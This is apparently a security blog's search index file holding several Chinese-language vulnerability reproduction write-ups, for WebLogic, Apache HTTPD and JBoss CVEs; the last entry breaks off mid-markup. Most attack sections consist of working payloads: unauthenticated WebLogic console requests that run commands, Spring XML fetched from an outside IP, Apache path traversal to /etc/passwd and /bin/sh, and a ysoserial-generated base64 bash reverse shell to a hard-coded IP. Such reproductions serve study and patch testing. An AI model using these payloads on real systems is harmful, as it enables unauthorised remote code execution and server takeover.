<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2020【14750,14882,14883】weblogic未授权命令执行复现</title>
      <link href="/article/a1981ad3.html"/>
      <url>/article/a1981ad3.html</url>
      
        <content type="html"><![CDATA[<h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p>WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。</p><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>未经身份验证的远程攻击者可能通过构造特殊的 HTTP GET请求，利用该漏洞在受影响的 WebLogic Server 上执行任意代码。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><pre class="line-numbers language-none"><code class="language-none">Oracle Weblogic Server 10.3.6.0.0Oracle Weblogic Server 12.1.3.0.0Oracle Weblogic Server 12.2.1.3.0Oracle Weblogic Server 12.2.1.4.0Oracle Weblogic Server 14.1.1.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>本次测试版本WebLogic12.2.1.4<br>下载地址：<br><code>https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html</code><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607251_20201030221957753_18260.png"><br>Java版本：<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607251_20201030224810393_9486.png"><br>需要用管理员权限运行<br><code>java -jar fmw_12.2.1.4.0_wls_lite_generic.jar</code><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607252_20201030230430097_15519.png"><br>默认下一步，选择含示列的完整安装<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607252_20201030230552878_22117.png"><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607252_20201030231039244_20374.png"><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607253_20201030231512877_6310.png"><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607253_20201030231528165_18174.png"><br>访问<br><code>http://Your ip:7001/console</code><br>出现登录页面即成功安装<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607253_20201030231706187_26897.png"></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="CVE-2020-14750-权限绕过漏洞"><a href="#CVE-2020-14750-权限绕过漏洞" class="headerlink" title="CVE-2020-14750: 权限绕过漏洞"></a>CVE-2020-14750: 权限绕过漏洞</h4><p>远程攻击者可以构造特殊的 HTTP 请求，在未经身份验证的情况下接管 WebLogic Server Console ，从而执行任意代码。</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;Your IP:7001&#x2F;console&#x2F;images&#x2F;%252E.&#x2F;console.portal<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="CVE-2020-14883-权限绕过漏洞"><a href="#CVE-2020-14883-权限绕过漏洞" class="headerlink" title="CVE-2020-14883: 权限绕过漏洞"></a>CVE-2020-14883: 权限绕过漏洞</h4><p>远程攻击者可以构造特殊的HTTP请求，在未经身份验证的情况下接管 WebLogic Server Console。<br>权限绕过漏洞（CVE-2020-14882），访问以下URL，未授权访问到管理后台页面（低权限的用户）：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;Your IP:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/2722623180160.png"></p><center>发现我们现在是低权限的用户，无法安装应用,所以组合下面的CVE-2020-14882 可以继续利用</center><hr><h4 id="CVE-2020-14882-代码执行漏洞"><a href="#CVE-2020-14882-代码执行漏洞" class="headerlink" title="CVE-2020-14882: 代码执行漏洞"></a>CVE-2020-14882: 代码执行漏洞</h4><p>首先通过非法字符绕过访问，然后通过Gadget启动命令执行，poc如下</p><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;console&#x2F;images&#x2F;%252E%252E%252Fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;HomePage1&amp;handle&#x3D;com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27calc.exe%27);%22); HTTP&#x2F;1.1Host: 192.168.3.189:7001User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko&#x2F;20100101 Firefox&#x2F;81.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8Accept-Language: en-US,en;q&#x3D;0.5Accept-Encoding: gzip, deflateConnection: closeCookie: ADMUpgrade-Insecure-Requests: 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607254_20201030232437984_680.png"><br>可以发现弹出计算器了<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607253_20201030232257621_24179.png"><br>修复建议<br>下载最新补丁<br>Oracle官方补丁需要用户持有正版软件的许可账号，使用该账号登陆<a href="https://support.oracle.com后,可以下载最新补丁./">https://support.oracle.com后，可以下载最新补丁。</a></p><hr><h2 id="linux下Weblogic-CVE-2020-14882，CVE-2020-14883"><a href="#linux下Weblogic-CVE-2020-14882，CVE-2020-14883" class="headerlink" title="linux下Weblogic(CVE-2020-14882，CVE-2020-14883)"></a>linux下Weblogic(CVE-2020-14882，CVE-2020-14883)</h2><p>  Weblogic是Oracle公司推出的J2EE应用服务器。在2020年10月的更新中，Oracle官方修复了两个长亭科技安全代表@voidfyoo提交的安全漏洞，分别是CVE-2020-14882和CVE-2020-14883。</p><p>  CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。使用这两个细分组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令。</p><h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>使用vulhub<code>docker-compose up -d</code><br>启动完成后，访问<a href="http://your-ip:7001/console%E5%8D%B3%E5%8F%AF%E6%9F%A5%E7%9C%8B%E5%88%B0%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2%E3%80%82">http://your-ip:7001/console即可查看到后台登录页面。</a></p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>首先测试权限绕过突破（CVE-2020-14882），访问以下URL，即可未授权访问到管理后台页面：<br><code>http://your-ip:7001/console/css/%252e%252e%252fconsole.portal</code><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607254_20201103154530307_25132.png"><br>访问后台后，可以发现我们现在是低权限的用户，无法安装应用，所以也无法直接执行任意代码：<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607254_20201103154625824_20719.png"><br>此时需要利用到第二个突破CVE-2020-14883。这个突破的利用方式有两种：<br>一是通过<code>com.tangosol.coherence.mvel2.sh.ShellSession</code><br>二是通过<code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code><br>直接访问如下URL，即可利用com.tangosol.coherence.mvel2.sh.ShellSession执行命令：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;your-ip:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;&amp;handle&#x3D;com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#39;touch%20&#x2F;tmp&#x2F;success1&#39;);&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进入容器，可以发现touch /tmp/success1已成功执行：<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607254_20201103155601050_1486.png"><br>这个利用方法只能在Weblogic 12.2.1以上版本利用，因为10.3.6并不存在<code>com.tangosol.coherence.mvel2.sh.ShellSession</code>类。<br><code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code>是一种更为通杀的方法，最初在CVE-2019-2725被提出，对于所有Weblogic版本均有效。</p><p><strong>首先，我们需要构造一个XML文件，将其保存在Weblogic可以访问到的服务器上，如<a href="http://8.210.235.249/RCE.xml%EF%BC%9A">http://8.210.235.249/RCE.xml：</a></strong></p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8" ?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>   <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>   <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pb<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.ProcessBuilder<span class="token punctuation">"</span></span> <span class="token attr-name">init-method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>start<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>list</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>bash<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>-c<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span><span class="token cdata">&lt;![CDATA[touch /tmp/success2]]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>list</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>constructor-arg</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后通过如下URL，即可让Weblogic加载这个XML，并执行其中的命令：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;your-ip:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;&amp;handle&#x3D;com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http:&#x2F;&#x2F;8.210.235.249&#x2F;RCE.xml&quot;)&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以使用python启动一起web服务(高效，快速，直观)<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607254_20201103160222148_3626.png"><br>加载恶意xml成功<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607255_20201103160351700_16604.png"><br>这个利用方法也有自己的缺点，就是需要Weblogic的服务器能够访问到恶意XML。</p><hr><h3 id="反弹shell的一些坑"><a href="#反弹shell的一些坑" class="headerlink" title="反弹shell的一些坑"></a>反弹shell的一些坑</h3><p>Linux反弹shell方法：使用加载恶意xml反弹shell<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607276_20201103161545603_3774.png"></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;106.75.229.39:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;&amp;handle&#x3D;com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(%22http:&#x2F;&#x2F;your-ip&#x2F;RCE.xml%22)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607276_20201103163050170_8883.png"></p><p>windows暂时没成功，很多大佬说的回显我也没成功。</p><p>参考：<br><code>https://mp.weixin.qq.com/s/48VIwTkyFVXUTS78kNByhg</code><br><code>https://blog.csdn.net/HezhezhiyuLe/article/details/95960479</code><br><code>https://github.com/vulhub/vulhub/blob/master/weblogic/CVE-2020-14882/README.zh-cn.md</code></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> weblogic </tag>
            
            <tag> CVE-2020-14750 </tag>
            
            <tag> CVE-2020-14882 </tag>
            
            <tag> CVE-2020-14883 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>apache 解析漏洞（CVE-2017-15715)</title>
      <link href="/article/1c1cce96.html"/>
      <url>/article/1c1cce96.html</url>
      
        <content type="html"><![CDATA[<h2 id="CVE-2017-15715"><a href="#CVE-2017-15715" class="headerlink" title="CVE-2017-15715"></a>CVE-2017-15715</h2><h3 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h3><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p><h3 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h3><p>使用Vulhub</p><h3 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h3><p>上传一个名为six.php的文件，被拦截：<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606482_20200907160230876_29113.png" alt="img"><br><strong>在1.php后面插入一个\x0A（注意，不能是\x0D\x0A，只能是一个\x0A），不再拦截：</strong><br>修改后</p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606482_20200908100228730_20905.png" alt="img"><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606482_20200908100418532_11097.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Apache HTTPD </tag>
            
            <tag> CVE-2017-15715 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache HTTP Server 2.4.49 路径穿越漏洞(CVE-2021-41773)</title>
      <link href="/article/3ec89881.html"/>
      <url>/article/3ec89881.html</url>
      
        <content type="html"><![CDATA[<h2 id="Apache-HTTP-Server-2-4-49-路径穿越漏洞-CVE-2021-41773"><a href="#Apache-HTTP-Server-2-4-49-路径穿越漏洞-CVE-2021-41773" class="headerlink" title="Apache HTTP Server 2.4.49 路径穿越漏洞(CVE-2021-41773)"></a>Apache HTTP Server 2.4.49 路径穿越漏洞(CVE-2021-41773)</h2><h3 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h3><p>Apache HTTP Server是Apache基金会开源的一款流行的HTTP服务器。在其2.4.49版本中，引入了一个路径穿越漏洞，满足下面两个条件的Apache服务器将会受到影响：<br>版本等于2.4.49<br>穿越的目录允许被访问，比如配置了<Directory />Require all granted</Directory>。（默认情况下是不允许的）<br>攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令。</p><p><strong>参考链接：</strong></p><ul><li><a href="https://httpd.apache.org/security/vulnerabilities_24.html">https://httpd.apache.org/security/vulnerabilities_24.html</a></li><li><a href="https://twitter.com/ptswarm/status/1445376079548624899">https://twitter.com/ptswarm/status/1445376079548624899</a></li><li><a href="https://twitter.com/HackerGautam/status/1445412108863041544">https://twitter.com/HackerGautam/status/1445412108863041544</a></li><li><a href="https://twitter.com/snyff/status/1445565903161102344">https://twitter.com/snyff/status/1445565903161102344</a></li><li><a href="https://github.com/vulhub/vulhub/blob/master/httpd/CVE-2021-41773/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/httpd/CVE-2021-41773/README.zh-cn.md</a></li></ul><h3 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h3><p>使用如下CURL命令来发送Payload（注意其中的/icons/必须是一个存在且可访问的目录）：<br><code>curl -v --path-as-is http://your-ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</code></p><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;&#x2F;icons&#x2F;.%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;etc&#x2F;passwd HTTP&#x2F;1.1Host: 106.55.147.147:8080User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko&#x2F;20100101 Firefox&#x2F;91.0Accept: *&#x2F;*Accept-Language: zh-CN,en;q&#x3D;0.5Accept-Encoding: gzip, deflateConnection: closePragma: no-cacheCache-Control: no-cache<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/2871523259279.png"></p><p>在服务端开启了cgi或cgid这两个mod的情况下，这个路径穿越漏洞将可以执行任意命令：<br><code>curl -v --data &quot;echo;id&quot; &#39;http://your-ip:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&#39;</code><br><code>curl -v --data &quot;echo;id&quot; -x 127.0.0.1:8080 &#39;http://106.55.147.147:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&#39;</code><br>-x 代表代理</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;cgi-bin&#x2F;.%2e&#x2F;.%2e&#x2F;.%2e&#x2F;.%2e&#x2F;bin&#x2F;sh HTTP&#x2F;1.1Host: Your ip:8080User-Agent: curl&#x2F;7.64.1Accept: *&#x2F;*Content-Length: 7Content-Type: application&#x2F;x-www-form-urlencodedConnection: closeecho;id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/198315816802.png"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Apache HTTPD </tag>
            
            <tag> CVE-2021-41773 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jboss CVE-2017-7504</title>
      <link href="/article/45a5e5d3.html"/>
      <url>/article/45a5e5d3.html</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h2 id="JBOSSMQ-JMS-CVE-2017-7504-集群反序列化漏洞-4-X"><a href="#JBOSSMQ-JMS-CVE-2017-7504-集群反序列化漏洞-4-X" class="headerlink" title="JBOSSMQ JMS CVE-2017-7504 集群反序列化漏洞 4.X"></a>JBOSSMQ JMS CVE-2017-7504 集群反序列化漏洞 4.X</h2><h3 id="0x01漏洞描述"><a href="#0x01漏洞描述" class="headerlink" title="0x01漏洞描述"></a>0x01漏洞描述</h3><p>JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java⽂件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利⽤该漏洞执⾏任意代码。</p><h3 id="0x02影响版本"><a href="#0x02影响版本" class="headerlink" title="0x02影响版本"></a>0x02影响版本</h3><p>JBoss AS 4.x及之前版本</p><h3 id="0x03漏洞利用"><a href="#0x03漏洞利用" class="headerlink" title="0x03漏洞利用"></a>0x03漏洞利用</h3><hr><p>1、首先验证目标jboss是否存在此漏洞,直接访问<br>/jbossmq-httpil/HTTPServerILServlet 路径下。若访问200或下载，则可能存在漏洞。<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606636_20201208220941482_14194.png"><br>此处我们使用<a href="https://github.com/joaomatosf/JavaDeserH2HC">JavaDeserH2HC</a>工具来利用该漏洞,尝试直接弹回一个shell<br>注意：这个工具在linux系统使用</p><pre class="line-numbers language-none"><code class="language-none">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.javajava -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 反弹的IP:端口curl http:&#x2F;&#x2F;目标IP:8080&#x2F;jbossmq-httpil&#x2F;HTTPServerILServlet&#x2F; --data-binary @ReverseShellCommonsCollectionsHashMap.ser<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>端口监听：</strong><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606636_20201208221156161_24717.png"><br>反弹shell成功<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606636_20201208221425595_28775.png"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JBOSS </tag>
            
            <tag> CVE-2017-7504 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JBOSS CVE-2017-12149</title>
      <link href="/article/c3936183.html"/>
      <url>/article/c3936183.html</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h2 id="JBOSS-CVE-2017-12149复现"><a href="#JBOSS-CVE-2017-12149复现" class="headerlink" title="JBOSS CVE-2017-12149复现"></a>JBOSS CVE-2017-12149复现</h2><h3 id="一、影响范围"><a href="#一、影响范围" class="headerlink" title="一、影响范围"></a>一、影响范围</h3><p>漏洞影响5.x和6.x版本的JBOSS AS。</p><h3 id="二、漏洞原理"><a href="#二、漏洞原理" class="headerlink" title="二、漏洞原理"></a>二、漏洞原理</h3><p>JBOSS Application Server是一个基于J2EE的开放源代码的应用服务器。 JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用，2006年，JBoss被Redhat公司收购。</p><p>2017年8月30日，厂商Redhat发布了一个JBOSSAS 5.x 的反序列化远程代码执行漏洞通告。该漏洞位于JBoss的HttpInvoker组件中的 ReadOnlyAccessFilter 过滤器中，其doFilter方法在没有进行任何安全检查和限制的情况下尝试将来自客户端的序列化数据流进行反序列化，导致攻击者可以通过精心设计的序列化数据来执行任意代码。但近期有安全研究者发现JBOSSAS 6.x也受该漏洞影响，攻击者利用该漏洞无需用户验证在系统上执行任意命令，获得服务器的控制权。</p><h3 id="三、攻击过程"><a href="#三、攻击过程" class="headerlink" title="三、攻击过程"></a>三、攻击过程</h3><p>访问漏洞环境<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606543_20200907102825405_8279.png"><br>访问访问<a href="http://8.210.152.234:8080//invoker/readonly">http://8.210.152.234:8080//invoker/readonly</a> 页面返回500错误 ,基本可以判断存在此漏洞<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606543_20200907102314863_29332.png"></p><h4 id="1-开启nc监听"><a href="#1-开启nc监听" class="headerlink" title="1.开启nc监听"></a>1.开启nc监听</h4><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606543_20200907102937678_15577.png"></p><h4 id="2-生成反弹shell命令"><a href="#2-生成反弹shell命令" class="headerlink" title="2.生成反弹shell命令"></a>2.生成反弹shell命令</h4><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606543_20200907103148639_996.png"></p><h4 id="3-反弹shell命令转换以后得到密令如下"><a href="#3-反弹shell命令转换以后得到密令如下" class="headerlink" title="3.反弹shell命令转换以后得到密令如下"></a>3.反弹shell命令转换以后得到密令如下</h4><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606543_20200907103459983_28482.png"></p><h4 id="4-序列化数据生成"><a href="#4-序列化数据生成" class="headerlink" title="4.序列化数据生成"></a>4.序列化数据生成</h4><p>使用ysoserial生成序列化数据，由于Vulhub使用的Java版本较新，所以选择使用的gadget是CommonsCollections5,如果不成功可以换成CommonsCollections6。1-10 都可以</p><pre class="line-numbers language-none"><code class="language-none">java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjIxMC4yMzUuMjQ5Lzk5OTkgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt;bb.ser<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606544_20200907104817445_3967.png"><br>将文件发送到服务器中(建议使用curl,曾经尝试使用burp发送 未成功)<br>命令如下<br><code>curl http://8.210.169.237:8080//invoker/readonly --data-binary @cs.ser</code><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606544_20200907104950059_18821.png"></p><h4 id="5-发送完成shell到手"><a href="#5-发送完成shell到手" class="headerlink" title="5.发送完成shell到手"></a>5.发送完成shell到手</h4><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606544_20200907105040493_6371.png"></p><h3 id="三、一键利用工具推荐"><a href="#三、一键利用工具推荐" class="headerlink" title="三、一键利用工具推荐"></a>三、一键利用工具推荐</h3><p><code>https://github.com/yunxu1/jboss-_CVE-2017-12149</code><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606544_20200907105427737_25318.png"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JBOSS </tag>
            
            <tag> CVE-2017-12149 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jboss JMX Console未授权访问Getshell</title>
      <link href="/article/be1e1f83.html"/>
      <url>/article/be1e1f83.html</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h2 id="Jboss-JMX-Console未授权访问Getshell"><a href="#Jboss-JMX-Console未授权访问Getshell" class="headerlink" title="Jboss JMX Console未授权访问Getshell"></a>Jboss JMX Console未授权访问Getshell</h2><h3 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h3><p>由于JBoss中/jmx-console/HtmlAdaptor路径对外开放，并且没有任何身份验证机制，导致攻击者可以进⼊到jmx控制台，并在其中执⾏任何功能</p><h3 id="影响版本："><a href="#影响版本：" class="headerlink" title="影响版本："></a>影响版本：</h3><p>Jboss4.x以下版本。</p><h3 id="利用方式："><a href="#利用方式：" class="headerlink" title="利用方式："></a>利用方式：</h3><blockquote><p>Jboxx4.x /jmx-console/ 后台存在未授权访问，进入后台后，可直接部署 war 包Getshell。若需登录，可以尝试爆破弱口令登录（类似于tomcat的War包配置漏洞）</p></blockquote><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建:"></a>环境搭建:</h3><h4 id="0x01-使用docker搭建漏洞环境"><a href="#0x01-使用docker搭建漏洞环境" class="headerlink" title="0x01:使用docker搭建漏洞环境"></a>0x01:使用docker搭建漏洞环境</h4><blockquote><p>一键安装Docker<br>这是推荐方式。在未安装过Docker的机器上，root权限执行如下命令即可一键安装最新版Docker：<br>curl -s <a href="https://get.docker.com/">https://get.docker.com/</a> | sh </p></blockquote><p>1、搜索漏洞环境：</p><pre class="line-numbers language-none"><code class="language-none">sudo docker search testjboss<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/5759958140263.png"><br>2、拉取镜像：</p><pre class="line-numbers language-none"><code class="language-none">sudo docker pull testjboss&#x2F;jboss<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/3844100168689.png"><br>3、查看现有的docker环境</p><pre class="line-numbers language-none"><code class="language-none">sudo docker images<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/1123202156556.png"><br>4、运行环境，访问<a href="http://ip即可/">http://ip即可</a></p><pre class="line-numbers language-none"><code class="language-none">sudo docker run -p 80:8080 -d testjboss&#x2F;jboss<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 